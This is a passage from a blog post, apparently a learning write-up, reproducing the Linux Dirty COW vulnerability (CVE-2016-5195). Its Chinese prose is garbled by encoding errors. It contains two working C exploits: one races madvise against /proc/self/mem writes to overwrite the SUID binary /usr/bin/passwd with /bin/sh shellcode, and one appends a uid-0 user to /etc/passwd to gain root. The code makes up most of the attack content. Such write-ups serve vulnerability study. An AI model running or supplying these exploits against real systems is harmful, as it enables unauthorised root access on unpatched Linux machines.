class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, attack_data, data_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <br>    dest_fd = open(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306190421.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />

<p><strong>Á¢éÁ¢éÂøµÔºö</strong></p>
<p>‚Äã	È¶ñÂÖàÊàëËØïÂõæÁî®<code>strlen</code>ÂÆåÊàêÂØπ<code>shellcode</code>ÁöÑËÆ°Êï∞Ôºå‰ΩÜÊòØÊó†ËÆ∫Â¶Ç‰ΩïÈÉΩÊó†Ê≥ïÊàêÂäüÔºå‰º∞ËÆ°ÊòØ<code>strlen</code>‰ºöÂØπÂÜÖÂ≠ò‰∏≠ÁöÑÈ°µÂ∏ÉÂ±ÄÊúâÂΩ±Âìçü§îÔºàÂ¶ÇÊûúÊúâÂ∏¶Â∏àÂÇÖ‰∫ÜËß£ÊòØ‰ªÄ‰πàÂéüÂõ†ËØ∑Âä°ÂøÖËÅîÁ≥ª‰∏Ä‰∏ãÈì∏Â∏ÅÁ¨îËÄÖÔºå‰∏çËÉúÊÑüÊøÄÂëúÂëúÂëúüò≠üò≠üò≠Ôºâ</p>
<p>‚Äã	ÂÖ∂Ê¨°ÊòØÈöè‰æøÊãâ‰∫Ü‰∏Ä‰∏™<code>kernel</code>È¢òÁöÑÊñá‰ª∂Á≥ªÁªüÔºåÊõøÊç¢‰∫Ü‰∏ãÂÜÖÊ†∏‰æøÂÖÖÂΩìÊºèÊ¥ûÂ§çÁé∞ÁéØÂ¢É‰∫ÜÔºåÁªìÊûúÂÖ∑Êúâ<code>suid</code>ÁöÑÊñá‰ª∂Âè™Êúâ<code>busybox</code>‰∏Ä‰∏™ÔºåËøôÁé©ÊÑèÊ†πÊú¨Ë¶ÜÂÜô‰∏ç‰∫Ü‰∏ÄÁÇπÔºåÂÜôÂÆåÁõ¥Êé•<code>kernel panic</code>„ÄÇÁÑ∂ÂêéÊîæ‰∫Ü‰∏Ä‰∏™ÊâãÂä®Ëµã‰∫à<code>suid</code>ÁöÑ<code>test</code>Á®ãÂ∫èËøõÂéªÔºåË¶ÜÂÜôÂÆåÊâßË°å‰ºö<code>segment fault</code>„ÄÇÊó†Â•àÂè™ËÉΩ‰∏ã‰∫Ü‰∏Ä‰∏™<code>ubuntu14.04</code>„ÄÇ</p>
<p>‚Äã	ÊúÄÂêé‰æøÊòØÊèêÂÆåÊùÉÂêéÔºåËøá‰∏Ä‰ºö‰ºöÔºå‰πü‰ºö<code>dump</code>Êéâ„ÄÇ</p>
<h2 id="Âà©Áî®-etc-passwd-ÂÆåÊàêÊèêÊùÉ"><a href="#Âà©Áî®-etc-passwd-ÂÆåÊàêÊèêÊùÉ" class="headerlink" title="Âà©Áî®&#x2F;etc&#x2F;passwd&#x2F;ÂÆåÊàêÊèêÊùÉ"></a>Âà©Áî®&#x2F;etc&#x2F;passwd&#x2F;ÂÆåÊàêÊèêÊùÉ</h2><p>ÂæÄ&#x2F;etc&#x2F;passwdÊñ∞Ê∑ª‰∏Ä‰∏™ÂÖ∑ÊúârootÊùÉÈôêÁöÑÁî®Êà∑Âç≥ÂèØ</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><span class="hljs-type">int</span> info_len;<br><span class="hljs-type">char</span> * info_data;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * name;<br>    <span class="hljs-type">char</span> * password;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> gid;<br>    <span class="hljs-type">char</span> * info;<br>    <span class="hljs-type">char</span> * home_dir;<br>    <span class="hljs-type">char</span> * shell;<br>&#125;;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, info_data, info_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span> <span class="hljs-title">korey_info</span>;</span><br>    <br>    korey_info.name = <span class="hljs-string">&quot;korey&quot;</span>;<br>    korey_info.password = <span class="hljs-string">&quot;password&quot;</span>;<br>    korey_info.uid = <span class="hljs-number">0</span>;<br>    korey_info.gid = <span class="hljs-number">0</span>;<br>    korey_info.info = <span class="hljs-string">&quot;korey0sh1&#x27;s shell&quot;</span>;<br>    korey_info.home_dir = <span class="hljs-string">&quot;/root&quot;</span>;<br>    korey_info.shell = <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br><br>    info_len = <span class="hljs-built_in">snprintf</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    info_data = <span class="hljs-built_in">malloc</span>(info_len + <span class="hljs-number">10</span>);<br>    <br>    <span class="hljs-built_in">sprintf</span>(info_data, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;info is &quot;</span>);<br>    write(<span class="hljs-number">1</span>, info_data, info_len);<br><br><br>    dest_fd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p><code>crypt.h</code>ÊòØ‰∏™Â§ñÈÉ®Â∫ìÔºåÊâÄ‰ª•ÁºñËØëÁöÑÊó∂ÂÄôË¶ÅÊâãÂä®Âä†‰∏™<code>-lcrypt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306201207.png" srcset="/img/loading.gif" lazyload></p>
<p>Ëøô‰∏™Â∞±ËàíÊúçÂ§ö‰∫Ü</p>
<h1 id="0xffÔºöÂÜôÂú®ÊúÄÂêé"><a href="#0xffÔºöÂÜôÂú®ÊúÄÂêé" class="headerlink" title="0xffÔºöÂÜôÂú®ÊúÄÂêé"></a>0xffÔºöÂÜôÂú®ÊúÄÂêé</h1><p>ÂâçÂêéËä±‰∫Ü‰∏ÄÂë®Â∑¶Âè≥ÔºåÊâçÁ£ïÁ£ïÁ¢∞Á¢∞Âú∞Â§çÁé∞ÂÆå‰∫ÜËøô‰∏™Âè§Êó©ÁöÑ<strong>CVE</strong></p>
<p>Êú¨Êù•ÊÉ≥ÁùÄËøô‰πàËÄÅÁöÑÊ¥ûÔºåËÉΩ‰∏çËÉΩËØïËØï‰∏çÁúãÂà´ÁöÑÂ∏àÂÇÖÁöÑËß£ÊûêÂíåpocÔºåËá™Â∑±ÊêûÊòéÁôΩÂπ∂ÊääexpÂÜôÂá∫Êù•üò≠üò≠üò≠</p>
<p>ÁªìÊûúÂ§ßÂ§±Ë¥•ÂëúÂëúÂëúü•µü•µü•µ</p>
<p>ÂõûÈ¶ñÁúã8Âπ¥ÂâçÁöÑ<strong>dirtycow</strong>ÔºåÁ¨îËÄÖÊ∑±Ê∑±Âú∞Ë¢´<code>Linux</code>ÂÜÖÊ†∏Âà©Áî®ÔºåËøôÈó®<code>old school</code>ÁöÑÈªëÂÆ¢ÁæéÂ≠¶ÊäòÊúç</p>
<p>Áé∞Âú®Áªà‰∫éÊòéÁôΩÂ∞è‰∏ÉÂ∏àÂÇÖËØ¥ÁöÑÔºöÂÜÖÊ†∏Âà©Áî®ÁöÑÂèëÂ±ïË∑ØÁ®ãÊú¨Ë∫´ÁöÑÈ≠ÖÂäõÂ∑≤ÁªèË∂≥Â§üÂê∏Âºï‰∫∫ÔºåÂú®Êµ∑ËæπÊ≤ôÊª©‰∏äÊç°Âà∞‰∏Ä‰∏™Ë¥ùÂ£≥Â∑≤ÁªèË∂≥Â§üÂºÄÂøÉ: )</p>
<p>ÊúõËÉΩ‰∏çÊñ≠ÂùöÊåÅ: )</p>
<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/">„ÄêCVE.0x00„ÄëCVE-2016-5195 ‚ÄúËÑèÁâõ‚ÄùÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê - arttnba3‚Äôs blog</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/583209105">ÂâñÊûêËÑèÁâõ3_-proc-self-memÊòØÊÄé‰πàÂÆûÁé∞ÁöÑ - Áü•‰πé (zhihu.com)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/OS/" class="print-no-link">#OS</a>
      
        <a href="/tags/linux/" class="print-no-link">#linux</a>
      
        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
      
        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2016-5195(Dirty Cow) Remake</div>
      <div>http://example.com/2024/02/27/dirtycow/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>korey0sh1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2024Âπ¥2Êúà27Êó•</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>ËÆ∏ÂèØÂçèËÆÆ</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/29/ret2hbp/" title="ret2hbp">
                        <span class="hidden-mobile">ret2hbp</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ÁõÆÂΩï</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="busuanzi_value_site_pv"></span>
         Ê¨°
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="busuanzi_value_site_uv"></span>
         ‰∫∫
      </span>
    
    
  
</div>

  
  
    <!-- Â§áÊ°à‰ø°ÊÅØ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      ‰∫¨ICPËØÅ123456Âè∑
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>‰∫¨ÂÖ¨ÁΩëÂÆâÂ§á12345678Âè∑</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
